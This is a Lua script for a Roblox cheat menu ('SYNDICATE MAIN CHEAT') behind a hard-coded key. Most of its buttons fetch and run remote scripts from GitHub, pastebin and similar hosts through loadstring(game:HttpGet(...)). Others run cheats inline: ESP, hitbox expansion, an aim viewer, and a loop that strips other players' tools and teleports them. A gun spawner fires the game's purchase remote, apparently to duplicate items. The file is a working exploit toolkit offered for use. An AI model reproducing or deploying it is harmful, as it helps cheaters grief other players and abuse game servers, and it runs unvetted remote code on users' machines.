local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "SYNDICATEKeySystem"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")


local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://17208361335"
sound.Volume = 1
sound.Parent = gui
sound:Play()


local frame = Instance.new("Frame")
frame.Size = UDim2.new(0,400,0,200)
frame.Position = UDim2.new(0.5,-200,0.5,-110)
frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
frame.BorderSizePixel = 0
frame.BackgroundTransparency = 0.1
frame.Parent = gui
Instance.new("UICorner",frame).CornerRadius = UDim.new(0,10)


local skullBg = Instance.new("ImageLabel")
skullBg.Size = UDim2.new(1,0,1,0)
skullBg.BackgroundTransparency = 1
skullBg.Image = "rbxassetid://85680685047977" -- bagong texture ID
skullBg.ScaleType = Enum.ScaleType.Crop
skullBg.ZIndex = 0
skullBg.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,-20,0,40)
title.Position = UDim2.new(0,10,0,10)
title.BackgroundTransparency = 1
title.Text = "SYNDICATE MAIN CHEAT"
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(255,255,255)
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 1
title.Parent = frame

local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1,-20,0,20)
sub.Position = UDim2.new(0,10,0,45)
sub.BackgroundTransparency = 1
sub.Text = "KEY SYSTEM"
sub.Font = Enum.Font.Gotham
sub.TextSize = 16
sub.TextColor3 = Color3.fromRGB(200,200,200)
sub.TextXAlignment = Enum.TextXAlignment.Left
sub.ZIndex = 1
sub.Parent = frame


local keyBox = Instance.new("TextBox")
keyBox.Size = UDim2.new(0.9,0,0,40)
keyBox.Position = UDim2.new(0.05,0,0.45,-20)
keyBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
keyBox.TextColor3 = Color3.fromRGB(255,255,255)
keyBox.PlaceholderText = "Enter key here..."
keyBox.Font = Enum.Font.Gotham
keyBox.TextSize = 16
keyBox.ZIndex = 1
keyBox.Parent = frame
Instance.new("UICorner", keyBox).CornerRadius = UDim.new(0,6)


local errorLabel = Instance.new("TextLabel")
errorLabel.Size = UDim2.new(1,0,0,20)
errorLabel.Position = UDim2.new(0,0,0.62,0)
errorLabel.BackgroundTransparency = 1
errorLabel.Text = ""
errorLabel.Font = Enum.Font.Gotham
errorLabel.TextSize = 14
errorLabel.TextColor3 = Color3.fromRGB(255,70,70)
errorLabel.ZIndex = 1
errorLabel.Parent = frame


local btn = Instance.new("TextButton")
btn.Size = UDim2.new(0.9,0,0,40)
btn.Position = UDim2.new(0.05,0,0.85,-20)
btn.BackgroundColor3 = Color3.fromRGB(40,40,40)
btn.Text = "ENTER KEY"
btn.TextColor3 = Color3.fromRGB(255,255,255)
btn.Font = Enum.Font.GothamBold
btn.TextSize = 18
btn.ZIndex = 1
btn.Parent = frame
Instance.new("UICorner", btn).CornerRadius = UDim.new(0,6)


local CorrectKey = "VINCENT-ACE-MENU-SYNDICATE"

btn.MouseButton1Click:Connect(function()
	if keyBox.Text == CorrectKey then
		gui:Destroy()
   local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
Name = "SYNDICATE MAIN CHEAT",
Icon = nil,
LoadingTitle = "SYNDICATE MAIN CHEAT...",
LoadingSubtitle = "LOADER ACE...",
ShowText = "SYNDICATE UI",

Theme = {
TextColor = Color3.fromRGB(235, 235, 235),

Background = Color3.fromRGB(15, 15, 18),  
  Topbar = Color3.fromRGB(20, 20, 25),  
  Shadow = Color3.fromRGB(8, 8, 10),  

  NotificationBackground = Color3.fromRGB(25, 25, 30),  
  NotificationActionsBackground = Color3.fromRGB(35, 35, 40),  

  TabBackground = Color3.fromRGB(28, 28, 32),  
  TabStroke = Color3.fromRGB(50, 50, 60),  
  TabBackgroundSelected = Color3.fromRGB(60, 60, 60),  
  TabTextColor = Color3.fromRGB(200, 200, 200),  
  SelectedTabTextColor = Color3.fromRGB(255, 255, 255),  

  ElementBackground = Color3.fromRGB(25, 25, 30),  
  ElementBackgroundHover = Color3.fromRGB(35, 35, 45),  
  SecondaryElementBackground = Color3.fromRGB(20, 20, 25),  
  ElementStroke = Color3.fromRGB(40, 40, 50),  
  SecondaryElementStroke = Color3.fromRGB(30, 30, 35),  
       
  SliderBackground = Color3.fromRGB(0, 90, 160),  
  SliderProgress = Color3.fromRGB(0, 162, 255),  
  SliderStroke = Color3.fromRGB(0, 200, 255),  

  ToggleBackground = Color3.fromRGB(30, 30, 35),  
  ToggleEnabled = Color3.fromRGB(0, 162, 255),  
  ToggleDisabled = Color3.fromRGB(80, 80, 80),  
  ToggleEnabledStroke = Color3.fromRGB(0, 200, 255),  
  ToggleDisabledStroke = Color3.fromRGB(65, 65, 65),  
  ToggleEnabledOuterStroke = Color3.fromRGB(100, 200, 255),  
  ToggleDisabledOuterStroke = Color3.fromRGB(45, 45, 45),  

  DropdownSelected = Color3.fromRGB(35, 35, 40),  
  DropdownUnselected = Color3.fromRGB(25, 25, 30),  

  InputBackground = Color3.fromRGB(25, 25, 30),  
  InputStroke = Color3.fromRGB(65, 65, 70),  
  PlaceholderColor = Color3.fromRGB(160, 160, 160)

},

ToggleUIKeybind = "K",
DisableRayfieldPrompts = true,
DisableBuildWarnings = true,

ConfigurationSaving = {
Enabled = true,
FolderName = nil,
FileName = "SYNDICATE-MAIN"
},

Discord = {
Enabled = true,
Invite = "vNm3fwxpX",
RememberJoins = true
},

KeySystem = false,
KeySettings = {
Title = "LUHOD SA GODZ!!",
Subtitle = "1KMI$TRAL ON TOP BABY",
Note = "1KMI$TRAL ON TOP BABYY",
FileName = "1KMI$TRAL",
SaveKey = true,
GrabKeyFromSite = false,
Key = "1KMI$TRAL-MAINCHEAT"
}
})
local MAINTab = Window:CreateTab("MAIN SCRIPT", "Rewind")
local MAINSection = MAINTab:CreateSection("SYNDICATE")

Rayfield:Notify({
Title = "SYNDICATE",
Content = "INVITE DISCORD LINK https://discord.gg/vNm3fwxpX",
Duration = 2.5,
Image = nil,
})

local Button = MAINTab:CreateButton({
Name = "INFINITE YIELD [SYNDICATE]",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end
})

local Button = MAINTab:CreateButton({
Name = "MUSIC EXPO [SYNDICATE]",
Callback = function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Ac6-Music-Vulnerability-25536"))()
end,
})

local Button = MAINTab:CreateButton({
Name = "BIG HEAD [SYNDICATE]",
Callback = function()
_G.HeadSize = 4 _G.Disabled = true game:GetService('RunService').RenderStepped:connect(function() if _G.Disabled then for i,v in next, game:GetService('Players'):GetPlayers() do if v.Name ~= game:GetService('Players').LocalPlayer.Name then pcall(function() v.Character.Head.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize) v.Character.Head.Transparency = 0.4 v.Character.Head.BrickColor = BrickColor.new("Red") v.Character.Head.Material = "Neon" v.Character.Head.CanCollide = false v.Character.Head.Massless = true end) end end end end)
end,
})

local Button = MAINTab:CreateButton({
Name = "FADED MENU [SYNDICATE]",
Callback = function()
_G.Toggles = "Y" -- You can put any keybind
loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded-Grid/main/YesEpic", true))()
end,
})

local Button = MAINTab:CreateButton({
Name = "BRING PARTS [SYNDICATE]",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BringFlingPlayers"))("More Scripts: t.me/arceusxscripts")
end,
})

local Button = MAINTab:CreateButton({
Name = "TOUCH FLING [SYNDICATE]",
Callback = function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Touch-Fling-46156"))()
end,
})

local Button = MAINTab:CreateButton({
Name = "HITBOX EXPANDER [SYNDICATE]",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ezsee/Hitbox-Expander123/refs/heads/main/waaaaaat"))()
end,
})

local Button = MAINTab:CreateButton({
Name = "FLING ALL [SYNDICATE]",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
end,
})

local Button = MAINTab:CreateButton({
    Name = "ESP [SYNDICATE]",
    Callback = function()
      -- ====== SERVICES ======
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- ====== SETTINGS ======
local espColor = Color3.fromRGB(0, 255, 0) -- green
local boxThickness = 2
local nameSize = 18
local boxPadding = 5

-- ====== FUNCTIONS ======
local function createESP(player)
    if player == LocalPlayer then return end

    local character = player.Character or player.CharacterAdded:Wait()
    local hrp = character:WaitForChild("HumanoidRootPart")

    local box = Drawing.new("Square")
    box.Visible = true
    box.Color = espColor
    box.Thickness = boxThickness
    box.Filled = false

    local nameLabel = Drawing.new("Text")
    nameLabel.Visible = true
    nameLabel.Color = espColor
    nameLabel.Center = true
    nameLabel.Size = nameSize
    nameLabel.Font = 2
    nameLabel.Text = player.Name

    RunService.RenderStepped:Connect(function()
        if character and hrp then
            local pos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
            if onScreen then
                local size = Vector2.new(50, 50)
                box.Position = Vector2.new(pos.X - size.X/2, pos.Y - size.Y/2)
                box.Size = size
                box.Visible = true

                nameLabel.Position = Vector2.new(pos.X, pos.Y - size.Y/2 - 15)
                nameLabel.Visible = true
            else
                box.Visible = false
                nameLabel.Visible = false
            end
        else
            box.Visible = false
            nameLabel.Visible = false
        end
    end)
end

-- ====== APPLY ESP ======
for _, player in pairs(Players:GetPlayers()) do
    createESP(player)
    player.CharacterAdded:Connect(function()
        createESP(player)
    end)
end

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        createESP(player)
    end)
end)  
    end,
})

local Button = MAINTab:CreateButton({
Name = "WICKED [SYNDICATE]",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/GY1wfJRZ"))()
end,
})

local SPAWNGUNTab = Window:CreateTab("SYNDICATE DUPE CHEAT", "Package")
local SPAWNGUNSection = SPAWNGUNTab:CreateSection("SPAWN GUN")

-- Rayfield button
SPAWNGUNTab:CreateButton({
Name = "GUN SHOP [SYNDICATE]",
Callback = function()
-- Gumawa ng Frame (rectangle container)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "GunSpawnerUI"
ScreenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 250, 0, 180)
Frame.Position = UDim2.new(0.5, -125, 0.5, -90) -- nasa gitna
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- UI Corner (rounded rectangle)
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = Frame

-- UI Stroke (outline)
local UIStroke = Instance.new("UIStroke")
UIStroke.Thickness = 2
UIStroke.Color = Color3.fromRGB(50, 138, 220)
UIStroke.Parent = Frame

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "GUN SHOPr [SYNDICATE]"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.TextColor3 = Color3.fromRGB(240,240,240)
Title.Parent = Frame

-- Input: Gun Name
local GunInput = Instance.new("TextBox")
GunInput.Size = UDim2.new(1, -20, 0, 30)
GunInput.Position = UDim2.new(0, 10, 0, 40)
GunInput.PlaceholderText = "Enter Gun Name"
GunInput.Text = ""
GunInput.TextColor3 = Color3.fromRGB(240,240,240)
GunInput.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
GunInput.Parent = Frame

-- Input: Amount
local AmountInput = Instance.new("TextBox")
AmountInput.Size = UDim2.new(1, -20, 0, 30)
AmountInput.Position = UDim2.new(0, 10, 0, 80)
AmountInput.PlaceholderText = "Enter Amount"
AmountInput.Text = ""
AmountInput.TextColor3 = Color3.fromRGB(240,240,240)
AmountInput.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
AmountInput.Parent = Frame

-- Button: Spawn Gun
local SpawnButton = Instance.new("TextButton")
SpawnButton.Size = UDim2.new(1, -20, 0, 35)
SpawnButton.Position = UDim2.new(0, 10, 0, 130)
SpawnButton.Text = "Spawn Gun"
SpawnButton.Font = Enum.Font.GothamBold
SpawnButton.TextSize = 16
SpawnButton.TextColor3 = Color3.fromRGB(255,255,255)
SpawnButton.BackgroundColor3 = Color3.fromRGB(50, 138, 220)
SpawnButton.Parent = Frame

-- Spawn Function
SpawnButton.MouseButton1Click:Connect(function()
    local gunName = GunInput.Text
    local amount = tonumber(AmountInput.Text) or 0
    if gunName ~= "" and amount ~= 0 then
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local GunShop = ReplicatedStorage:FindFirstChild("GunShop")
        if GunShop and GunShop:FindFirstChild("Events") and GunShop.Events:FindFirstChild("Purchase") then
            GunShop.Events.Purchase:FireServer(gunName, amount)
        end
    end
end)
   end,
})

-- FPS Booster Button (Rayfield example)

local Button = MAINTab:CreateButton({
Name = "BOOST FPS [SYNDICATE]",
Callback = function()
_G.Ignore = {}
_G.Settings = {
Players = {
["Ignore Me"] = true,
["Ignore Others"] = true,
["Ignore Tools"] = true
},
Meshes = {
NoMesh = false,
NoTexture = false,
Destroy = false
},
Images = {
Invisible = true,
Destroy = false
},
Explosions = {
Smaller = true,
Invisible = false, -- Not for PVP games
Destroy = false -- Not for PVP games
},
Particles = {
Invisible = true,
Destroy = false
},
TextLabels = {
LowerQuality = true,
Invisible = false,
Destroy = false
},
MeshParts = {
LowerQuality = true,
Invisible = false,
NoTexture = false,
NoMesh = false,
Destroy = false
},
Other = {
["FPS Cap"] = 240, -- true to uncap
["No Camera Effects"] = true,
["No Clothes"] = true,
["Low Water Graphics"] = true,
["No Shadows"] = true,
["Low Rendering"] = true,
["Low Quality Parts"] = true,
["Low Quality Models"] = true,
["Reset Materials"] = true,
}
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
end
})

local Button = MAINTab:CreateButton({
Name = "DEX EXPLORER [SYNDICATE]",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/MassiveHubs/loadstring/refs/heads/main/DexXenoAndRezware'))()
end
})

local ACETab = Window:CreateTab("SYNDICATE EXECUTOR", "select all")
local Section = ACETab:CreateSection("FANSTAMA CHEAT")

local Button = ACETab:CreateButton({
Name = "SYNDICATE EXECUTOR [SYNDICATE]",
Callback = function()

end
})

local Button = MAINTab:CreateButton({
Name = "AIMBOT PC [SYNDICATE]",
Callback = function()
local Aimbot = loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-V3/main/src/Aimbot.lua"))()
Aimbot.Load()
end
})

local Button = MAINTab:CreateButton({
Name = "LOOPBRING ALL [NOT MENU] [SYNDICATE]",
Callback = function()
local L1 = true;
local L2 = game.Players.LocalPlayer.Character.HumanoidRootPart;
local L3 = L2.Position - Vector3.new(5, 0, 0)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(L_4_arg1)
    if L_4_arg1 == 'f' then
        L1 = not L1
    end;
    if L_4_arg1 == 'r' then
        L2 = game.Players.LocalPlayer.Character.HumanoidRootPart;
        L3 = L2.Position - Vector3.new(5, 0, 0)
    end
end)

for L_5_forvar1, L_6_forvar2 in pairs(game.Players:GetPlayers()) do
    if L_6_forvar2 == game.Players.LocalPlayer then
    else
        local L7 = coroutine.create(function()
            game:GetService('RunService').RenderStepped:Connect(function()
                local L8, L9 = pcall(function()
                    local L10 = L_6_forvar2.Character;
                    if L10 then
                        if L10:FindFirstChild("HumanoidRootPart") then
                            if L1 then
                                L_6_forvar2.Backpack:ClearAllChildren()
                                for L_11_forvar1, L_12_forvar2 in pairs(L10:GetChildren()) do
                                    if L_12_forvar2:IsA("Tool") then
                                        L_12_forvar2:Destroy()
                                    end
                                end;
                                L10.HumanoidRootPart.CFrame = CFrame.new(L3)
                            end
                        end
                    end
                end)
                if L8 then
                else
                    warn("Unnormal error: "..L9)
                end
            end)
        end)
        coroutine.resume(L7)
    end
end;
-- check for updates
game.Players.PlayerAdded:Connect(function(L_13_arg1)
    if L_13_arg1 == game.Players.LocalPlayer then
    else
        local L14 = coroutine.create(function()
            game:GetService('RunService').RenderStepped:Connect(function()
                local L15, L16 = pcall(function()
                    local L17 = L_13_arg1.Character;
                    if L17 then
                        if L17:FindFirstChild("HumanoidRootPart") then
                            if L1 then
                                L_13_arg1.Backpack:ClearAllChildren()
                                for L_18_forvar1, L_19_forvar2 in pairs(L17:GetChildren()) do
                                    if L_19_forvar2:IsA("Tool") then
                                        L_19_forvar2:Destroy()
                                    end
                                end;
                                L17.HumanoidRootPart.CFrame = CFrame.new(L3)
                            end
                        end
                    end
                end)
                if L15 then
                else
                    warn("Unnormal error: "..L16)
                end
            end)
        end)
        coroutine.resume(L14)
    end
end)
end
})


local Button = MAINTab:CreateButton({
Name = "REMOTE SPY [SYNDICATE]",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
end
})

local Button = MAINTab:CreateButton({
Name = "AIM VIEWER [SYNDICATE]",
Callback = function()
--// SYNDICATE AIM VIEWER
-- LocalScript (Executor or StarterPlayerScripts)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Remove old GUI
if PlayerGui:FindFirstChild("AimViewerGui") then
    PlayerGui.AimViewerGui:Destroy()
end

-- ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "AimViewerGui"
gui.Parent = PlayerGui
gui.ResetOnSpawn = false

-- Main Frame (rectangle)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 280, 0, 120)
frame.Position = UDim2.new(0.5, -140, 0.4, -60)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 2
frame.Parent = gui
frame.Active = true
frame.Draggable = true

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0.3, 0)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.BorderSizePixel = 0
title.Text = "SYN AIM VIEWER"
title.Font = Enum.Font.GothamBold
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Parent = frame

-- Status label
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, 0, 0.7, 0)
status.Position = UDim2.new(0, 0, 0.3, 0)
status.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
status.BorderSizePixel = 0
status.Text = "Aim Viewer: OFF"
status.Font = Enum.Font.GothamBold
status.TextColor3 = Color3.fromRGB(255, 255, 255)
status.TextScaled = true
status.Parent = frame

-- Variables
local enabled = false
local aimLines = {}

-- Function: toggle ON/OFF
local function toggle()
    enabled = not enabled
    status.Text = "Aim Viewer: " .. (enabled and "ON" or "OFF")

    if not enabled then
        -- Destroy ALL beams and attachments instantly
        for _, data in pairs(aimLines) do
            if data.beam then data.beam:Destroy() end
            if data.a1 then data.a1:Destroy() end
        end
        aimLines = {} -- clear table
    end
end

-- Toggle when clicking the status label
status.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        toggle()
    end
end)

-- Draw aim lines every frame
RunService.RenderStepped:Connect(function()
    if enabled then
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("Head") then
                local head = plr.Character.Head
                local lookVec = head.CFrame.LookVector
                local origin = head.Position
                local endpoint = origin + (lookVec * 50)

                -- Draw/update Beam line
                if not aimLines[plr] then
                    local attachment0 = Instance.new("Attachment")
                    attachment0.Parent = head
                    local attachment1 = Instance.new("Attachment")
                    attachment1.Parent = workspace.Terrain

                    local beam = Instance.new("Beam")
                    beam.Color = ColorSequence.new(Color3.fromRGB(0, 255, 0))
                    beam.FaceCamera = true
                    beam.Width0 = 0.1
                    beam.Width1 = 0.1
                    beam.Attachment0 = attachment0
                    beam.Attachment1 = attachment1
                    beam.Parent = head

                    aimLines[plr] = {
                        a1 = attachment1,
                        beam = beam
                    }
                end

                -- Update beam endpoint
                aimLines[plr].a1.WorldPosition = endpoint
            end
        end
    end
end)
end
})
	else
		btn.Text = "❌ Invalid key .Try again"
		task.delay(1.5,function()
			btn.Text = "ENTER KEY"
		end)
	end
end)

local UserInputService = game:GetService("UserInputService")
local dragging, dragInput, dragStart, startPos

local function update(input)
	local delta = input.Position - dragStart
	frame.Position = UDim2.new(
		startPos.X.Scale,
		startPos.X.Offset + delta.X,
		startPos.Y.Scale,
		startPos.Y.Offset + delta.Y
	)
end

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
